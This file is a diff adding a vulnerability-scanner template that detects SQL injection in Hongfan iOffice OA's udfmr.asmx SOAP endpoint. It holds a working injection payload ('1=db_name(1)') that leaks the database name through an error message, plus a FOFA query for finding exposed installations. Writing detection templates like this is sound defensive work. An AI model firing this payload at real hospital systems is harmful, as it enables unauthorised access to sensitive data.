@@ -1,0 +1,52 @@
+id: hongfan-ioffice-sqli
+
+info:
+  name: Hongfan OA udfmr.asmx - SQL injection
+  author: SleepingBag945
+  severity: high
+  description: |
+    There is a SQL injection vulnerability in Hongfan iOffice 10 Hospital Edition, which can be exploited by attackers to obtain sensitive database information.
+  reference:
+    - https://github.com/lal0ne/vulnerability/blob/main/%E7%BA%A2%E5%B8%86OA/iOffice_sqlscan/sql.py
+    - https://github.com/MrWQ/vulnerability-paper/blob/master/bugs/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91%E7%BA%A2%E5%B8%86%E5%8C%BB%E7%96%97%E4%BA%91%20OA%20udfmr.asmx%20SQL%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: app="红帆-ioffice"
+  tags: hongfan,oa,sqli
+
+http:
+  - raw:
+      - |
+        POST /iOffice/prg/set/wss/udfmr.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        SOAPAction: http://tempuri.org/ioffice/udfmr/GetEmpSearch
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <GetEmpSearch xmlns="http://tempuri.org/ioffice/udfmr">
+              <condition>1=db_name(1)</condition>
+            </GetEmpSearch>
+          </soap:Body>
+        </soap:Envelope>
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "System.Data.SqlClient.SqlException:"
+          - "nvarchar"
+        condition: and
+
+      - type: word
+        part: header
+        words:
+          - "text/xml"
+
+      - type: status
+        status:
+          - 500
+# digest: 490a0046304402204578ac1acc01b5e4b76dd16e54d364ab43081c6c9617808566b40bc2491e4f35022053e9378e1267c8434fdd4e7cddca29056c0f6d58ddc464c9706679f91ff40069:922c64590222798bb761d5b6d8e72950
